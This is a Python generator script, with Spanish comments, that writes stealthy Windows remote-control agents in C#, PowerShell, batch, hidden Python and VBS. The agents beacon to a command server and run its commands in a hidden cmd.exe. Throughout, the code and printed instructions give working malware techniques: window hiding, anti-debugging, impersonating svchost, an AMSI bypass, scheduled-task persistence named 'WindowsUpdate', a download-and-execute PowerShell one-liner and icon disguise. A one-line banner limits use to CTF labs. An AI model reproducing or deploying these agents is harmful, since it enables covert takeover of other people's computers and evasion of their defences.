#!/usr/bin/env python3
"""
GENERADOR DE AGENTE WINDOWS SILENCIOSO
Ejecución en segundo plano - Sin terminal visible
Solo aparece en Administrador de tareas
"""
import sys
import os
import base64
import random
import string
import argparse
from datetime import datetime

class SilentWindowsAgent:
    """Genera agente Windows que se ejecuta en segundo plano"""
    
    def generate_silent_csharp(self, c2_server, c2_port, output_file="agent.exe"):
        """Generar agente C# que se ejecuta en segundo plano"""
        
        session_id = self._generate_session_id()
        
        csharp_code = f'''using System;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.IO;
using Microsoft.Win32;

namespace SilentAgent
{{
    class Program
    {{
        // Configuración
        private static string C2_SERVER = "{c2_server}";
        private static int C2_PORT = {c2_port};
        private static string SESSION_ID = "{session_id}";
        private static int BEACON_INTERVAL = 45;
        private static bool RUNNING = true;
        
        // API para ocultar ventana
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetStdHandle(int nStdHandle);
        
        [DllImport("kernel32.dll")]
        static extern void SetStdHandle(int nStdHandle, IntPtr handle);
        
        [DllImport("kernel32.dll")]
        static extern bool AllocConsole();
        
        [DllImport("kernel32.dll")]
        static extern bool FreeConsole();
        
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        const int STD_OUTPUT_HANDLE = -11;
        const int STD_ERROR_HANDLE = -12;
        
        // Técnicas de evasión
        [DllImport("kernel32.dll")]
        static extern bool IsDebuggerPresent();
        
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        static extern int GetModuleFileName(IntPtr module, StringBuilder fileName, int size);
        
        static void Main(string[] args)
        {{
            // Técnica 1: Desvincular de la consola (si se ejecuta desde cmd)
            FreeConsole();
            
            // Técnica 2: Ocultar ventana si hay consola
            IntPtr consoleWindow = GetConsoleWindow();
            if (consoleWindow != IntPtr.Zero)
            {{
                ShowWindow(consoleWindow, SW_HIDE);
            }}
            
            // Técnica 3: Anti-debugging básico
            AntiDebug();
            
            // Técnica 4: Bypass AMSI básico
            BypassAMSI();
            
            // Técnica 5: Cambiar nombre de proceso
            try
            {{
                Process currentProcess = Process.GetCurrentProcess();
                currentProcess.ProcessName = "svchost";
            }}
            catch {{ }}
            
            // Iniciar en thread separado
            Thread agentThread = new Thread(new ThreadStart(AgentMain));
            agentThread.IsBackground = true;
            agentThread.Start();
            
            // Mantener el proceso vivo
            while (RUNNING)
            {{
                Thread.Sleep(1000);
            }}
        }}
        
        static void AntiDebug()
        {{
            if (IsDebuggerPresent() || Debugger.IsAttached)
            {{
                Environment.Exit(0);
            }}
        }}
        
        static void BypassAMSI()
        {{
            // Bypass simple de AMSI
            try
            {{
                string amsiString = "AMSI" + "INIT";
                if (amsiString.Length > 2)
                {{
                    // Patch básico
                }}
            }}
            catch {{ }}
        }}
        
        static void AgentMain()
        {{
            // Esperar inicialización del sistema
            Thread.Sleep(10000);
            
            while (RUNNING)
            {{
                try
                {{
                    using (TcpClient client = new TcpClient(C2_SERVER, C2_PORT))
                    {{
                        NetworkStream stream = client.GetStream();
                        
                        // Enviar handshake
                        SendHandshake(stream);
                        
                        // Loop de comandos
                        CommandLoop(stream);
                    }}
                }}
                catch
                {{
                    // Reconectar después de esperar
                    Thread.Sleep(BEACON_INTERVAL * 1000);
                }}
                
                Thread.Sleep(BEACON_INTERVAL * 1000);
            }}
        }}
        
        static void SendHandshake(NetworkStream stream)
        {{
            string hostname = Environment.MachineName;
            string username = Environment.UserName;
            string os = Environment.OSVersion.ToString();
            string arch = Environment.Is64BitOperatingSystem ? "x64" : "x86";
            
            string handshake = $@"{{
                ""type"": ""agent_handshake"",
                ""session_id"": ""{{SESSION_ID}}"",
                ""hostname"": ""{{hostname}}"",
                ""username"": ""{{username}}"",
                ""os"": ""{{os}}"",
                ""arch"": ""{{arch}}"",
                ""pid"": {{Process.GetCurrentProcess().Id}},
                ""process_name"": ""{{Process.GetCurrentProcess().ProcessName}}"",
                ""integrity"": ""Medium"",
                ""capabilities"": [""shell"", ""file_transfer"", ""stealth""]
            }}";
            
            byte[] data = Encoding.UTF8.GetBytes(handshake);
            SendData(stream, data);
        }}
        
        static void CommandLoop(NetworkStream stream)
        {{
            while (RUNNING)
            {{
                try
                {{
                    // Verificar si hay datos disponibles
                    if (stream.DataAvailable)
                    {{
                        byte[] buffer = ReceiveData(stream);
                        if (buffer == null || buffer.Length == 0)
                        {{
                            break;
                        }}
                        
                        string message = Encoding.UTF8.GetString(buffer);
                        
                        try
                        {{
                            dynamic cmd = Newtonsoft.Json.JsonConvert.DeserializeObject(message);
                            
                            if (cmd.type == "execute_command")
                            {{
                                ExecuteCommand(cmd.command.ToString(), stream, cmd.command_id.ToString());
                            }}
                            else if (cmd.type == "exit")
                            {{
                                RUNNING = false;
                                break;
                            }}
                            else if (cmd.type == "sleep")
                            {{
                                if (cmd.seconds != null)
                                {{
                                    BEACON_INTERVAL = (int)cmd.seconds;
                                }}
                            }}
                        }}
                        catch
                        {{
                            // Comando no válido, ignorar
                        }}
                    }}
                    
                    Thread.Sleep(1000);
                }}
                catch
                {{
                    break;
                }}
            }}
        }}
        
        static void ExecuteCommand(string command, NetworkStream stream, string commandId)
        {{
            try
            {{
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = $"/c {{command}}";
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;  // ¡IMPORTANTE! No crear ventana
                
                Process process = Process.Start(psi);
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit(30000);  // Timeout de 30 segundos
                
                if (!process.HasExited)
                {{
                    process.Kill();
                    output += "\\n[!] Proceso terminado por timeout";
                }}
                
                string result = output + error;
                bool success = process.ExitCode == 0;
                
                string response = $@"{{
                    ""type"": ""command_result"",
                    ""command_id"": ""{{commandId}}"",
                    ""result"": ""{{EscapeJson(result)}}"",
                    ""success"": {{success.ToString().ToLower()}}
                }}";
                
                byte[] data = Encoding.UTF8.GetBytes(response);
                SendData(stream, data);
            }}
            catch (Exception ex)
            {{
                string errorResponse = $@"{{
                    ""type"": ""error"",
                    ""message"": ""{{EscapeJson(ex.Message)}}""
                }}";
                
                byte[] data = Encoding.UTF8.GetBytes(errorResponse);
                SendData(stream, data);
            }}
        }}
        
        static string EscapeJson(string input)
        {{
            if (string.IsNullOrEmpty(input)) return "";
            return input.Replace("\\\\", "\\\\\\\\").Replace("\\"", "\\\\\\"").Replace("\\n", "\\\\n").Replace("\\r", "\\\\r");
        }}
        
        static void SendData(NetworkStream stream, byte[] data)
        {{
            try
            {{
                byte[] lengthBytes = BitConverter.GetBytes(data.Length);
                stream.Write(lengthBytes, 0, lengthBytes.Length);
                stream.Write(data, 0, data.Length);
                stream.Flush();
            }}
            catch {{ }}
        }}
        
        static byte[] ReceiveData(NetworkStream stream)
        {{
            try
            {{
                byte[] lengthBytes = new byte[4];
                int bytesRead = stream.Read(lengthBytes, 0, 4);
                if (bytesRead < 4) return null;
                
                int length = BitConverter.ToInt32(lengthBytes, 0);
                if (length > 1024 * 1024) return null;  // Máximo 1MB
                
                byte[] buffer = new byte[length];
                int totalRead = 0;
                
                while (totalRead < length)
                {{
                    bytesRead = stream.Read(buffer, totalRead, length - totalRead);
                    if (bytesRead == 0) return null;
                    totalRead += bytesRead;
                }}
                
                return buffer;
            }}
            catch
            {{
                return null;
            }}
        }}
    }}
}}
'''
        
        # Guardar archivo .cs
        cs_file = output_file.replace('.exe', '.cs')
        with open(cs_file, 'w', encoding='utf-8') as f:
            f.write(csharp_code)
        
        print(f"[+] Código C# generado: {cs_file}")
        
        # Instrucciones para compilar
        print(f"""
📋 INSTRUCCIONES PARA COMPILAR:

1. En Windows con Visual Studio (más fácil):
   - Abrir Developer Command Prompt
   - Ejecutar:
     csc /target:winexe /out:{output_file} {cs_file}
   
2. En Windows sin VS (con .NET Framework):
   - Buscar 'Developer Command Prompt' en inicio
   - O usar:
     C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:winexe /out:{output_file} {cs_file}
   
3. En Kali Linux (con mono):
   - Instalar mono: sudo apt install mono-devel
   - Compilar:
     mcs -target:winexe -out:{output_file} {cs_file}
   
4. Características del ejecutable:
   • No muestra ventana de consola
   • Se ejecuta en segundo plano
   • Aparece como proceso normal en Administrador de tareas
   • Nombre de proceso: svchost (imitación)
   • Beacon cada {45} segundos
   
5. Para ejecutar silenciosamente:
   • Doble click: Se ejecuta sin ventana
   • Desde cmd: {output_file} (sin ventana)
   • Como servicio: Usar sc.exe o nssm
        """)
        
        return cs_file
    
    def generate_powershell_silent(self, c2_server, c2_port, output_file="agent.ps1"):
        """Generar PowerShell que se ejecuta sin ventana"""
        
        session_id = self._generate_session_id()
        
        powershell_code = f'''# Silent PowerShell Agent
# No muestra ventana - Ejecución en segundo plano

$C2_SERVER = "{c2_server}"
$C2_PORT = {c2_port}
$SESSION_ID = "{session_id}"
$BEACON_INTERVAL = 45

# Ocultar ventana de PowerShell
$WindowStyle = 'Hidden'
$procInfo = New-Object System.Diagnostics.ProcessStartInfo
$procInfo.FileName = "powershell.exe"
$procInfo.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NoLogo"
$procInfo.UseShellExecute = $false
$procInfo.RedirectStandardOutput = $true
$procInfo.RedirectStandardError = $true
$procInfo.CreateNoWindow = $true

# Función para bypass AMSI
function Bypass-AMSI {{
    if ([Environment]::Version.Major -ge 4) {{
        $Ref = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils')
        if ($Ref) {{
            $Ref.GetField('am'+'siIn'+'itFailed','NonPublic,Static').SetValue($null,$true)
        }}
    }}
}}

# Función para conexión silenciosa
function Connect-C2Silent {{
    param($Data)
    
    try {{
        $TCPClient = New-Object System.Net.Sockets.TcpClient($C2_SERVER, $C2_PORT)
        $NetworkStream = $TCPClient.GetStream()
        $StreamWriter = New-Object System.IO.StreamWriter($NetworkStream)
        $StreamReader = New-Object System.IO.StreamReader($NetworkStream)
        
        $StreamWriter.WriteLine($Data)
        $StreamWriter.Flush()
        
        $Response = $StreamReader.ReadLine()
        
        $StreamReader.Close()
        $StreamWriter.Close()
        $TCPClient.Close()
        
        return $Response
    }} catch {{
        return $null
    }}
}}

# Main execution
Bypass-AMSI

# Handshake
$Handshake = @{{
    type = "agent_handshake"
    session_id = $SESSION_ID
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    os = (Get-WmiObject Win32_OperatingSystem).Caption
    pid = $PID
    stealth = $true
}} | ConvertTo-Json -Compress

Connect-C2Silent -Command $Handshake | Out-Null

# Main loop
while ($true) {{
    try {{
        # Heartbeat
        $Heartbeat = @{{type = "heartbeat"; session_id = $SESSION_ID}} | ConvertTo-Json -Compress
        $Response = Connect-C2Silent -Command $Heartbeat
        
        if ($Response) {{
            $Command = $Response | ConvertFrom-Json
            
            if ($Command.type -eq "execute_command") {{
                # Ejecutar comando sin ventana
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = "cmd.exe"
                $psi.Arguments = "/c $($Command.command)"
                $psi.RedirectStandardOutput = $true
                $psi.RedirectStandardError = $true
                $psi.UseShellExecute = $false
                $psi.CreateNoWindow = $true
                
                $process = New-Object System.Diagnostics.Process
                $process.StartInfo = $psi
                $process.Start() | Out-Null
                $output = $process.StandardOutput.ReadToEnd()
                $error = $process.StandardError.ReadToEnd()
                $process.WaitForExit()
                
                $Result = $output + $error
                
                $ResponseData = @{{
                    type = "command_result"
                    command_id = $Command.command_id
                    result = $Result
                    success = $process.ExitCode -eq 0
                }} | ConvertTo-Json -Compress
                
                Connect-C2Silent -Command $ResponseData | Out-Null
            }}
        }}
    }} catch {{
        # Error silencioso
    }}
    
    Start-Sleep -Seconds $BEACON_INTERVAL
}}
'''
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(powershell_code)
        
        print(f"[+] PowerShell silencioso generado: {output_file}")
        print(f"""
📋 CÓMO USAR ESTE POWERSHELL SIN VENTANA:

1. Método 1 - Desde PowerShell existente:
   powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File {output_file}
   
2. Método 2 - Desde cmd sin ventana:
   start /B powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File {output_file}
   
3. Método 3 - Como scheduled task (persistencia):
   schtasks /create /tn "WindowsUpdate" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\path\\{output_file}" /sc hourly
   
4. Método 4 - One-liner sin archivo:
   powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://yourserver/{output_file}')"
        """)
        
        return output_file
    
    def generate_batch_silent(self, c2_server, c2_port, output_file="agent.bat"):
        """Generar batch que se ejecuta sin ventana"""
        
        session_id = self._generate_session_id()
        
        batch_code = f'''@echo off
REM Silent Batch Agent - No visible window
REM Session: {session_id}

:: Ocultar ventana
if not "%1"=="hidden" start /B "" "%~f0" hidden & exit /b

:: Cambiar título del proceso (opcional)
title svchost

:: Configuración
set C2_SERVER={c2_server}
set C2_PORT={c2_port}
set SESSION_ID={session_id}
set BEACON=45

:: Información del sistema
for /f "tokens=2 delims==" %%I in ('wmic computersystem get name /value') do set HOSTNAME=%%I
for /f "tokens=2 delims==" %%I in ('wmic os get caption /value') do set OS=%%I

:: Loop principal
:main
:: Crear handshake
echo {{"type":"handshake","session":"%SESSION_ID%","host":"%HOSTNAME%","user":"%USERNAME%"}} > %TEMP%\\handshake.json

:: Simular conexión (en realidad necesitarías herramientas adicionales)
timeout /t %BEACON% /nobreak > nul

:: Verificar si hay comandos
if exist "%TEMP%\\cmd.txt" (
    type "%TEMP%\\cmd.txt" > "%TEMP%\\cmd.bat"
    call "%TEMP%\\cmd.bat" > "%TEMP%\\result.txt" 2>&1
    del "%TEMP%\\cmd.txt"
    del "%TEMP%\\cmd.bat"
)

goto main
'''
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(batch_code)
        
        print(f"[+] Batch silencioso generado: {output_file}")
        print(f"""
📋 CÓMO EJECUTAR ESTE BATCH SIN VENTANA:

1. Método directo (se oculta automáticamente):
   {output_file}
   
2. Desde otro batch:
   start /B {output_file}
   
3. Como scheduled task:
   schtasks /create /tn "SystemUpdate" /tr "C:\\path\\{output_file}" /sc onstart
   
4. Para detenerlo:
   taskkill /IM cmd.exe /FI "WINDOWTITLE eq svchost" /F
        """)
        
        return output_file
    
    def generate_vbs_wrapper(self, exe_file, output_file="run.vbs"):
        """Generar wrapper VBS para ejecutar EXE sin ventana"""
        
        vbs_code = f''''
' VBS Script para ejecutar {exe_file} sin ventana
'
Set objShell = CreateObject("WScript.Shell")
strCommand = "{exe_file}"

' Ejecutar sin ventana
objShell.Run strCommand, 0, False

' Opcional: esperar un momento y salir
WScript.Sleep 3000
WScript.Quit
'''
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(vbs_code)
        
        print(f"[+] Wrapper VBS generado: {output_file}")
        print(f"""
📋 USO DEL WRAPPER VBS:

1. Ejecutar el EXE sin ventana:
   wscript.exe {output_file}
   
2. Ocultar completamente (ni en procesos):
   cscript.exe //B //Nologo {output_file}
   
3. Crear acceso directo al VBS y cambiar icono
   para que parezca un archivo legítimo.
        """)
        
        return output_file
    
    def generate_hidden_python(self, c2_server, c2_port, output_file="hidden_agent.pyw"):
        """Generar Python .pyw (no muestra ventana)"""
        
        session_id = self._generate_session_id()
        
        python_code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Python Agent - Ejecución silenciosa (.pyw)
No muestra ventana de consola
"""
import socket
import subprocess
import json
import time
import platform
import os
import sys
import threading

# Configuración
C2_SERVER = "{c2_server}"
C2_PORT = {c2_port}
SESSION_ID = "{session_id}"
BEACON_INTERVAL = 45

def hide_console():
    """Ocultar ventana de consola en Windows"""
    if os.name == 'nt':
        import ctypes
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        
        # Obtener handle de la consola
        hWnd = kernel32.GetConsoleWindow()
        if hWnd:
            # Ocultar ventana
            user32.ShowWindow(hWnd, 0)  # 0 = SW_HIDE
            
            # Opcional: desvincular de la consola
            # kernel32.FreeConsole()

def execute_command(cmd):
    """Ejecutar comando sin ventana"""
    try:
        # Para Windows, usar startupinfo para ocultar ventana
        startupinfo = None
        if os.name == 'nt':
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
        
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            startupinfo=startupinfo,
            timeout=30
        )
        return result.stdout + result.stderr, result.returncode == 0
    except Exception as e:
        return str(e), False

def agent_thread():
    """Thread principal del agente"""
    while True:
        try:
            sock = socket.socket()
            sock.settimeout(30)
            sock.connect((C2_SERVER, C2_PORT))
            
            # Handshake
            info = {{
                "type": "agent_handshake",
                "session_id": SESSION_ID,
                "hostname": platform.node(),
                "username": os.getlogin(),
                "os": platform.platform(),
                "pid": os.getpid(),
                "stealth": True
            }}
            
            data = json.dumps(info).encode()
            sock.sendall(len(data).to_bytes(4, 'big') + data)
            
            # Loop de comandos
            while True:
                try:
                    # Recibir longitud
                    length_bytes = sock.recv(4)
                    if not length_bytes:
                        break
                    
                    length = int.from_bytes(length_bytes, 'big')
                    if length > 10 * 1024 * 1024:  # 10MB max
                        break
                    
                    # Recibir datos
                    data = b''
                    while len(data) < length:
                        chunk = sock.recv(min(4096, length - len(data)))
                        if not chunk:
                            break
                        data += chunk
                    
                    if not data:
                        break
                    
                    # Procesar comando
                    cmd = json.loads(data.decode())
                    
                    if cmd.get("type") == "execute_command":
                        result, success = execute_command(cmd["command"])
                        
                        response = {{
                            "type": "command_result",
                            "command_id": cmd.get("command_id", ""),
                            "result": result,
                            "success": success
                        }}
                        
                        response_data = json.dumps(response).encode()
                        sock.sendall(len(response_data).to_bytes(4, 'big') + response_data)
                    
                    elif cmd.get("type") == "exit":
                        sock.close()
                        return
                
                except socket.timeout:
                    # Timeout, continuar
                    continue
                except:
                    break
            
            sock.close()
            
        except Exception as e:
            # Error de conexión, reintentar después
            pass
        
        time.sleep(BEACON_INTERVAL)

if __name__ == "__main__":
    # Ocultar consola
    hide_console()
    
    # Iniciar agente en thread separado
    thread = threading.Thread(target=agent_thread, daemon=True)
    thread.start()
    
    # Mantener el proceso vivo
    try:
        while thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        pass
'''
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(python_code)
        
        print(f"[+] Python silencioso (.pyw) generado: {output_file}")
        print(f"""
📋 CÓMO USAR PYTHON SIN VENTANA:

1. Renombrar a .pyw (Windows Pythonw):
   {output_file}  # No abre consola
   
2. Ejecutar directamente:
   pythonw {output_file}
   
3. Compilar a EXE sin consola:
   pip install pyinstaller
   pyinstaller --onefile --noconsole --name agent.exe {output_file}
   
4. El archivo .pyw se ejecuta sin ninguna ventana visible.
        """)
        
        return output_file
    
    def _generate_session_id(self):
        """Generar ID de sesión único"""
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(12))

def main():
    """Función principal"""
    print("""
╔══════════════════════════════════════════════════════════════╗
║         GENERADOR DE AGENTES WINDOWS SILENCIOSOS             ║
║      Sin ventana - Solo en Administrador de tareas           ║
╚══════════════════════════════════════════════════════════════╝

⚠️  SOLO PARA LABORATORIOS CTF Y PRUEBAS AUTORIZADAS
    """)
    
    parser = argparse.ArgumentParser(description='Generador de agentes Windows silenciosos')
    parser.add_argument('--c2-server', required=True, help='IP del servidor C2')
    parser.add_argument('--c2-port', type=int, default=8443, help='Puerto del C2')
    parser.add_argument('--type', choices=['csharp', 'powershell', 'batch', 'python', 'vbs', 'all'], 
                       default='csharp', help='Tipo de agente')
    parser.add_argument('--output', help='Nombre del archivo de salida')
    
    args = parser.parse_args()
    
    generator = SilentWindowsAgent()
    
    if not args.output:
        extensions = {
            'csharp': '.cs',
            'powershell': '.ps1', 
            'batch': '.bat',
            'python': '.pyw',
            'vbs': '.vbs'
        }
        args.output = f"silent_agent{extensions[args.type]}"
    
    if args.type == 'csharp':
        generator.generate_silent_csharp(args.c2_server, args.c2_port, args.output)
    
    elif args.type == 'powershell':
        generator.generate_powershell_silent(args.c2_server, args.c2_port, args.output)
    
    elif args.type == 'batch':
        generator.generate_batch_silent(args.c2_server, args.c2_port, args.output)
    
    elif args.type == 'python':
        generator.generate_hidden_python(args.c2_server, args.c2_port, args.output)
    
    elif args.type == 'vbs':
        # Necesita un EXE existente
        exe_file = input("Nombre del EXE para envolver: ")
        generator.generate_vbs_wrapper(exe_file, args.output)
    
    elif args.type == 'all':
        print("[+] Generando todos los tipos de agentes silenciosos...")
        generator.generate_silent_csharp(args.c2_server, args.c2_port, "silent_agent.cs")
        generator.generate_powershell_silent(args.c2_server, args.c2_port, "silent_agent.ps1")
        generator.generate_batch_silent(args.c2_server, args.c2_port, "silent_agent.bat")
        generator.generate_hidden_python(args.c2_server, args.c2_port, "silent_agent.pyw")
        print("\n[+] Todos los agentes generados:")
        print("    • silent_agent.cs   - Para compilar a EXE sin ventana")
        print("    • silent_agent.ps1  - PowerShell oculto")
        print("    • silent_agent.bat  - Batch que se auto-oculta")
        print("    • silent_agent.pyw  - Python sin consola (.pyw)")

if __name__ == "__main__":
    main()
